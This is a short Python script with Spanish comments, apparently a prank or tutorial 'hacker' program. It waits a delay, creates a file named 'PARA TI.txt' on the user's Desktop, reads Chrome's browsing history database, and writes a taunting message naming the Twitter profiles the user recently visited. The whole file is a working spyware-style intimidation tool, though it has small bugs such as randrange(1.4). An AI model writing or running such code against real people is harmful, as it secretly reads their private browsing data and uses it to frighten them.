import os
from time import sleep
from pathlib import Path
from random import randrange
import sqlite3
import re

HACKER_FILE_NAME = "PARA TI.txt"

def get_user_path():
    return "{}/".format(Path.home())

def delay_action():
    n_hours = randrange(1.4)
    print("Durmiendo {}".format(n_hours))
    #sleep(n_hours * 60 * 60) # Para que tarde 3 horas
    sleep(n_hours) # para que vaya rapido

def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola soy un H4X0R.\n")
    return hacker_file

def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible reintentando en 3s ...\n")
            sleep(3)

def check_history_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history[:10]:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2]) # Capturamos lo que hay dentro de ()
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    hacker_file.write("He visto que has estado husmeando en lso perfiles de {}...".format(", ".join(profiles_visited)))

def main():

    # Esperamos entre 1 y 3 horas para que se ejecute
    delay_action()

    # Calculamos la ruta del usuario
    user_path = get_user_path()

    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)

    # Recogemos su historial en google chrome    
    chrome_history = get_chrome_history(user_path)
    
    # Escribiendo mensajes
    check_history_and_scare_user(hacker_file, chrome_history)


if __name__ == "__main__":
    main()